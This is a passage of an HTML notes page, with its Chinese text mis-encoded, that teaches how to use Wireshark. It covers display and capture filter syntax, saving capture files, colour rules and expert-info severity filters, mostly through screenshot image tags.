src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1609403656706-a2c7be3e-a13f-4e9f-8aab-d43c34f7eb2f.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1609403656706-a2c7be3e-a13f-4e9f-8aab-d43c34f7eb2f.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=">ä¼šå‘ç°ç›´æ¥åœ¨ Apply a display filter é‡Œè¾“å…¥æ˜¯æ— æ³•è¿‡æ»¤çš„ï¼Œ<br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605596923337-d58d67de-11ac-40bc-b8f2-db9247089e3a.png#align=left&display=inline&height=81&margin=%5Bobject%20Object%5D&name=image.png&originHeight=162&originWidth=2030&size=49871&status=done&style=none&width=1015" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605596923337-d58d67de-11ac-40bc-b8f2-db9247089e3a.png#align=left&display=inline&height=81&margin=%5Bobject%20Object%5D&name=image.png&originHeight=162&originWidth=2030&size=49871&status=done&style=none&width=1015" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>æ–°ç‰ˆçš„ wireshark çš„ expression åŠŸèƒ½åœ¨å¦‚ä¸‹å›¾æ‰€ç¤ºè¿™é‡Œ<br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605596905704-d89032c3-4269-4f6e-8810-ce1b552bebfa.png#align=left&display=inline&height=102&margin=%5Bobject%20Object%5D&name=image.png&originHeight=204&originWidth=1092&size=351036&status=done&style=none&width=546" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605596905704-d89032c3-4269-4f6e-8810-ce1b552bebfa.png#align=left&display=inline&height=102&margin=%5Bobject%20Object%5D&name=image.png&originHeight=204&originWidth=1092&size=351036&status=done&style=none&width=546" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605597076739-900b2bb3-44ab-4f94-9ec3-bf9505a48b59.png#align=left&display=inline&height=1560&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1560&originWidth=1364&size=294373&status=done&style=none&width=1364" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605597076739-900b2bb3-44ab-4f94-9ec3-bf9505a48b59.png#align=left&display=inline&height=1560&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1560&originWidth=1364&size=294373&status=done&style=none&width=1364" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br>åœ¨ wireshark é‡Œï¼Œä¸æ˜¯ç›´æ¥ä½¿ç”¨ host æ¥è¡¨ç¤ºä¸»æœºåå’Œå¯¹åº”çš„ ip åœ°å€ï¼Œè€Œæ˜¯ä½¿ç”¨ <code>ip.addr = &lt;ip&gt;</code> æ¥è¡¨ç¤º<br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605597207635-3bdda931-5a71-4992-9606-8571a61abf33.png#align=left&display=inline&height=538&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1076&originWidth=2048&size=415173&status=done&style=none&width=1024" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605597207635-3bdda931-5a71-4992-9606-8571a61abf33.png#align=left&display=inline&height=538&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1076&originWidth=2048&size=415173&status=done&style=none&width=1024" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br>å…¶ä»–ä¹Ÿæ˜¯ç±»ä¼¼ï¼Œå¦‚ <code>ip.src</code> å’Œ <code>ip.dst</code></p><p>åœ¨æ‰¾æœåŠ¡è¿™ä¸€å—ï¼ŒæœåŠ¡éƒ½æ˜¯ä»¥å ç”¨ç«¯å£çš„å½¢å¼å±•ç¤ºçš„ï¼Œå› æ­¤å¯ä»¥é€šè¿‡è¿™ç§å½¢å¼æ¥çœ‹æ€ä¹ˆç”¨ï¼Œç„¶åç‚¹OKå³å¯ã€‚<br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605597599273-503985ea-6cb9-4db9-ab74-510f0be84fe4.png#align=left&display=inline&height=790&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1580&originWidth=1382&size=225399&status=done&style=none&width=691" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605597599273-503985ea-6cb9-4db9-ab74-510f0be84fe4.png#align=left&display=inline&height=790&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1580&originWidth=1382&size=225399&status=done&style=none&width=691" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605597669802-2e2afe27-0f4e-46fa-89da-02a723a37013.png#align=left&display=inline&height=147&margin=%5Bobject%20Object%5D&name=image.png&originHeight=294&originWidth=1858&size=103612&status=done&style=none&width=929" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605597669802-2e2afe27-0f4e-46fa-89da-02a723a37013.png#align=left&display=inline&height=147&margin=%5Bobject%20Object%5D&name=image.png&originHeight=294&originWidth=1858&size=103612&status=done&style=none&width=929" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>ä¹Ÿå¯ä»¥ä½¿ç”¨ é€»è¾‘è¿ç®—ç¬¦å®ç°ç­›é€‰ï¼Œå¦‚ <code>tcp.port == 80 and ip.src == 192.168.123.37</code><br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605597781937-1d89cd2f-0eb3-41f1-a3bb-df0d14953671.png#align=left&display=inline&height=195&margin=%5Bobject%20Object%5D&name=image.png&originHeight=390&originWidth=1776&size=148999&status=done&style=none&width=888" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605597781937-1d89cd2f-0eb3-41f1-a3bb-df0d14953671.png#align=left&display=inline&height=195&margin=%5Bobject%20Object%5D&name=image.png&originHeight=390&originWidth=1776&size=148999&status=done&style=none&width=888" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br>å½“ç„¶ä¹Ÿæœ‰ç±»ä¼¼è¡¥å…¨çš„æ“ä½œ<br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605597947739-2a348fee-51e0-4c72-8253-9b2ded65fbdc.png#align=left&display=inline&height=330&margin=%5Bobject%20Object%5D&name=image.png&originHeight=660&originWidth=644&size=127152&status=done&style=none&width=322" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605597947739-2a348fee-51e0-4c72-8253-9b2ded65fbdc.png#align=left&display=inline&height=330&margin=%5Bobject%20Object%5D&name=image.png&originHeight=660&originWidth=644&size=127152&status=done&style=none&width=322" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h3 id="wiresharkåŒ…è¿‡æ»¤å™¨åˆ†ç±»-éµå¾ªä¼¯å…‹åˆ©è¯­æ³•è§„åˆ™"><a href="#wiresharkåŒ…è¿‡æ»¤å™¨åˆ†ç±»-éµå¾ªä¼¯å…‹åˆ©è¯­æ³•è§„åˆ™" class="headerlink" title="wiresharkåŒ…è¿‡æ»¤å™¨åˆ†ç±» - éµå¾ªä¼¯å…‹åˆ©è¯­æ³•è§„åˆ™"></a>wiresharkåŒ…è¿‡æ»¤å™¨åˆ†ç±» - éµå¾ªä¼¯å…‹åˆ©è¯­æ³•è§„åˆ™</h3><h4 id="æ•è·è¿‡æ»¤å™¨-gt-åœ¨æŠ“åŒ…ä¹‹å‰è¿›è¡Œè®¾ç½®ï¼Œåœ¨æŠ“å–æ—¶ï¼Œå°±ä¸ä¼šæŠ“å–ä¸ç¬¦åˆæ–‡ä»¶çš„æ•°æ®åŒ…"><a href="#æ•è·è¿‡æ»¤å™¨-gt-åœ¨æŠ“åŒ…ä¹‹å‰è¿›è¡Œè®¾ç½®ï¼Œåœ¨æŠ“å–æ—¶ï¼Œå°±ä¸ä¼šæŠ“å–ä¸ç¬¦åˆæ–‡ä»¶çš„æ•°æ®åŒ…" class="headerlink" title="æ•è·è¿‡æ»¤å™¨ -&gt; åœ¨æŠ“åŒ…ä¹‹å‰è¿›è¡Œè®¾ç½®ï¼Œåœ¨æŠ“å–æ—¶ï¼Œå°±ä¸ä¼šæŠ“å–ä¸ç¬¦åˆæ–‡ä»¶çš„æ•°æ®åŒ…"></a>æ•è·è¿‡æ»¤å™¨ -&gt; åœ¨æŠ“åŒ…ä¹‹å‰è¿›è¡Œè®¾ç½®ï¼Œåœ¨æŠ“å–æ—¶ï¼Œå°±ä¸ä¼šæŠ“å–ä¸ç¬¦åˆæ–‡ä»¶çš„æ•°æ®åŒ…</h4><ul><li>åªæ•è·ç›®æ ‡ç«¯å£ä¸º80çš„TCPæ•°æ®åŒ… -&gt; tcp dst port 80</li></ul><p><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605600789660-89c5429d-7f5f-4183-a4d9-30e155016176.png#align=left&display=inline&height=266&margin=%5Bobject%20Object%5D&name=image.png&originHeight=532&originWidth=1854&size=93280&status=done&style=none&width=927" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605600789660-89c5429d-7f5f-4183-a4d9-30e155016176.png#align=left&display=inline&height=266&margin=%5Bobject%20Object%5D&name=image.png&originHeight=532&originWidth=1854&size=93280&status=done&style=none&width=927" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><ul><li>æ•è·ç›®çš„ä¸»æœºIPåœ°å€ä¸º 192.168.123.37 çš„æ•°æ®åŒ… -&gt;  dst host 192.168.123.37</li></ul><p><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605598844368-732cad15-57e4-4dd9-abf0-d71be66473cf.png#align=left&display=inline&height=622&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1244&originWidth=1940&size=424659&status=done&style=none&width=970" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605598844368-732cad15-57e4-4dd9-abf0-d71be66473cf.png#align=left&display=inline&height=622&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1244&originWidth=1940&size=424659&status=done&style=none&width=970" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><ul><li>host ä¸æ”¯æŒ cidr åŸŸå ä¹¦å†™</li></ul><hr><h4 id="ç­›é€‰è¿‡æ»¤å™¨-ï¼ˆæ˜¾ç¤ºè¿‡æ»¤å™¨ï¼‰-gt-æŠ“åŒ…ä¹‹åè¿›è¡Œåº”ç”¨çš„ï¼Œå³å†æ¬¡ç­›é€‰"><a href="#ç­›é€‰è¿‡æ»¤å™¨-ï¼ˆæ˜¾ç¤ºè¿‡æ»¤å™¨ï¼‰-gt-æŠ“åŒ…ä¹‹åè¿›è¡Œåº”ç”¨çš„ï¼Œå³å†æ¬¡ç­›é€‰" class="headerlink" title="ç­›é€‰è¿‡æ»¤å™¨ ï¼ˆæ˜¾ç¤ºè¿‡æ»¤å™¨ï¼‰-&gt; æŠ“åŒ…ä¹‹åè¿›è¡Œåº”ç”¨çš„ï¼Œå³å†æ¬¡ç­›é€‰"></a>ç­›é€‰è¿‡æ»¤å™¨ ï¼ˆæ˜¾ç¤ºè¿‡æ»¤å™¨ï¼‰-&gt; æŠ“åŒ…ä¹‹åè¿›è¡Œåº”ç”¨çš„ï¼Œå³å†æ¬¡ç­›é€‰</h4><p>ç„¶åæ˜¾ç¤ºè¿‡æ»¤å™¨æœ‰ä¸¤ç§åˆ›å»ºæ–¹å¼</p><ol><li>è¾“å…¥æ¡†åˆ›å»º</li></ol><p><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605601233639-e457aa42-a7b5-4891-8fc2-c698c34c1ecd.png#align=left&display=inline&height=81&margin=%5Bobject%20Object%5D&name=image.png&originHeight=162&originWidth=1978&size=53501&status=done&style=none&width=989" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605601233639-e457aa42-a7b5-4891-8fc2-c698c34c1ecd.png#align=left&display=inline&height=81&margin=%5Bobject%20Object%5D&name=image.png&originHeight=162&originWidth=1978&size=53501&status=done&style=none&width=989" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>å½“ä¸çŸ¥é“å¦‚ä½•åˆ›å»ºå°±çœ‹ä¸‹å›¾è¿™é‡Œ<br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605596905704-d89032c3-4269-4f6e-8810-ce1b552bebfa.png#align=left&display=inline&height=102&margin=%5Bobject%20Object%5D&name=image.png&originHeight=204&originWidth=1092&size=351036&status=done&style=none&width=546" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605596905704-d89032c3-4269-4f6e-8810-ce1b552bebfa.png#align=left&display=inline&height=102&margin=%5Bobject%20Object%5D&name=image.png&originHeight=204&originWidth=1092&size=351036&status=done&style=none&width=546" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605601817671-4b8aacb8-a22a-46ca-a9ee-3d63fc6252b0.png#align=left&display=inline&height=127&margin=%5Bobject%20Object%5D&name=image.png&originHeight=254&originWidth=1676&size=71687&status=done&style=none&width=838" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605601817671-4b8aacb8-a22a-46ca-a9ee-3d63fc6252b0.png#align=left&display=inline&height=127&margin=%5Bobject%20Object%5D&name=image.png&originHeight=254&originWidth=1676&size=71687&status=done&style=none&width=838" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><ol start="2"><li>æ•°æ®åŒ…ç»†èŠ‚é¢æ¿åˆ›å»º</li></ol><p><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605601904173-042a79ec-cc27-412c-af8e-31788678c6cd.png#align=left&display=inline&height=958&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1916&originWidth=1916&size=548155&status=done&style=none&width=958" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605601904173-042a79ec-cc27-412c-af8e-31788678c6cd.png#align=left&display=inline&height=958&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1916&originWidth=1916&size=548155&status=done&style=none&width=958" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p><code>... and Selected</code> è¡¨ç¤º <code>ç›®å‰çš„è¿‡æ»¤å™¨ + and è¿›è¡Œè¿æ¥</code><br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605602001225-0aa493f3-13c3-4b9e-8289-03f735d8542a.png#align=left&display=inline&height=274&margin=%5Bobject%20Object%5D&name=image.png&originHeight=548&originWidth=1742&size=173915&status=done&style=none&width=871" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605602001225-0aa493f3-13c3-4b9e-8289-03f735d8542a.png#align=left&display=inline&height=274&margin=%5Bobject%20Object%5D&name=image.png&originHeight=548&originWidth=1742&size=173915&status=done&style=none&width=871" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br>ä¸€å¼€å§‹æ˜¯åªæœ‰ <code>Selected</code> å’Œ Not <code>Selected</code> çš„</p><ul><li>è¡¨è¾¾å¼è§„åˆ™<ul><li>ä¸»é¢˜ + è¿ç®—ç¬¦ + å€¼</li><li>é€»è¾‘å…³ç³» ä¸ æˆ– é -&gt; and (&amp;&amp;) or (||) not (!)</li></ul></li></ul><hr><h2 id="Wireshark-æ•è·æ•°æ®åŒ…æ–‡ä»¶ä¿å­˜"><a href="#Wireshark-æ•è·æ•°æ®åŒ…æ–‡ä»¶ä¿å­˜" class="headerlink" title="Wireshark æ•è·æ•°æ®åŒ…æ–‡ä»¶ä¿å­˜"></a>Wireshark æ•è·æ•°æ®åŒ…æ–‡ä»¶ä¿å­˜</h2><p><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1609403657147-c0c230fd-d6d4-4ce2-947c-7ad19f6b7a2c.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1609403657147-c0c230fd-d6d4-4ce2-947c-7ad19f6b7a2c.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605603567135-ad1cb52f-9675-4759-be52-08a54b9edd37.png#align=left&display=inline&height=470&margin=%5Bobject%20Object%5D&name=image.png&originHeight=940&originWidth=1874&size=163117&status=done&style=none&width=937" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605603567135-ad1cb52f-9675-4759-be52-08a54b9edd37.png#align=left&display=inline&height=470&margin=%5Bobject%20Object%5D&name=image.png&originHeight=940&originWidth=1874&size=163117&status=done&style=none&width=937" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h2 id="æ‚é¡¹è®¾ç½®"><a href="#æ‚é¡¹è®¾ç½®" class="headerlink" title="æ‚é¡¹è®¾ç½®"></a>æ‚é¡¹è®¾ç½®</h2><h3 id="wireshark-æ•°æ®åŒ…é¢œè‰²çš„æ„æ€"><a href="#wireshark-æ•°æ®åŒ…é¢œè‰²çš„æ„æ€" class="headerlink" title="wireshark æ•°æ®åŒ…é¢œè‰²çš„æ„æ€"></a>wireshark æ•°æ®åŒ…é¢œè‰²çš„æ„æ€</h3><p>å¯ä»¥é€šè¿‡ è§†å›¾ -&gt; ç€è‰²è§„åˆ™è¿›è¡ŒæŸ¥çœ‹<br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1609403830739-6199a1ef-386d-41e9-84f9-3b62a9831357.png#align=left&display=inline&height=497&margin=%5Bobject%20Object%5D&name=image.png&originHeight=497&originWidth=411&size=34240&status=done&style=none&width=411" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1609403830739-6199a1ef-386d-41e9-84f9-3b62a9831357.png#align=left&display=inline&height=497&margin=%5Bobject%20Object%5D&name=image.png&originHeight=497&originWidth=411&size=34240&status=done&style=none&width=411" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1609403800570-75efd63b-cb87-4794-91df-d72ffbd50b9f.png#align=left&display=inline&height=544&margin=%5Bobject%20Object%5D&name=image.png&originHeight=544&originWidth=739&size=56387&status=done&style=none&width=739" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1609403800570-75efd63b-cb87-4794-91df-d72ffbd50b9f.png#align=left&display=inline&height=544&margin=%5Bobject%20Object%5D&name=image.png&originHeight=544&originWidth=739&size=56387&status=done&style=none&width=739" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h3 id="wireshark-æ•…éšœåŒ…è¿‡æ»¤"><a href="#wireshark-æ•…éšœåŒ…è¿‡æ»¤" class="headerlink" title="wireshark æ•…éšœåŒ…è¿‡æ»¤"></a>wireshark æ•…éšœåŒ…è¿‡æ»¤</h3><p><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1609405235320-31bd23b5-dc62-4c14-bf3f-fb4dd674d692.png#align=left&display=inline&height=534&margin=%5Bobject%20Object%5D&name=image.png&originHeight=534&originWidth=501&size=38877&status=done&style=none&width=501" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1609405235320-31bd23b5-dc62-4c14-bf3f-fb4dd674d692.png#align=left&display=inline&height=534&margin=%5Bobject%20Object%5D&name=image.png&originHeight=534&originWidth=501&size=38877&status=done&style=none&width=501" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br>æœ‰5ä¸ªç­‰çº§</p><ul><li>Error ä¸¥é‡é”™è¯¯ï¼Œè­¬å¦‚ï¼šç•¸å½¢æ•°æ®åŒ…æˆ–è¯†åˆ«å‡ºæ•°æ®åŒ…åè®®å¤´éƒ¨çš„æŸäº›å­—æ®µå’Œé¢„æœŸå€¼ä¸ç¬¦</li><li>Warning ä¸€èˆ¬æ€§é—®é¢˜ï¼ˆåº”ç”¨ç¨‹åºé—®é¢˜æˆ–é€šä¿¡é—®é¢˜ï¼‰ï¼Œè­¬å¦‚ï¼šTCP zero window ,TCP window full ,TCPæŠ¥æ–‡æ®µå¤±åºï¼ŒTCPæŠ¥æ–‡æ®µä¸¢å¤±</li><li>Note å¯èƒ½å¼•å‘æ•…éšœçš„å¼‚å¸¸ç°è±¡ï¼ˆæ­£å¸¸è¡Œä¸ºï¼‰ï¼Œè­¬å¦‚ï¼šTCPé‡ä¼ ï¼Œé‡å¤ç¡®è®¤ï¼Œå¿«é€Ÿé‡ä¼ </li><li>Chat ç¬¦åˆå¸¸è§„æµé‡çš„ç‰¹å¾ï¼Œè­¬å¦‚ï¼šSYN,FIN,RST</li><li>Comment</li><li>OK</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">_ws.expert.severity &lt;&#x3D; Note</span><br><span class="line">æˆ–è€…</span><br><span class="line">_ws.expert.severity &lt;&#x3D; Chat</span><br></pre></td></tr></table></figure><h3 id="æŸ¥çœ‹wireshark-å†…ç½®æ–‡ä»¶è·¯å¾„"><a href="#æŸ¥çœ‹wireshark-å†…ç½®æ–‡ä»¶è·¯å¾„" class="headerlink" title="æŸ¥çœ‹wireshark å†…ç½®æ–‡ä»¶è·¯å¾„"></a>æŸ¥çœ‹wireshark å†…ç½®æ–‡ä»¶è·¯å¾„</h3><p><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605623740999-b327567c-e8cd-4775-ac39-abbf8a1ed8fe.png#align=left&display=inline&height=713&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1426&originWidth=1816&size=1833604&status=done&style=none&width=908" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605623740999-b327567c-e8cd-4775-ac39-abbf8a1ed8fe.png#align=left&display=inline&height=713&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1426&originWidth=1816&size=1833604&status=done&style=none&width=908" 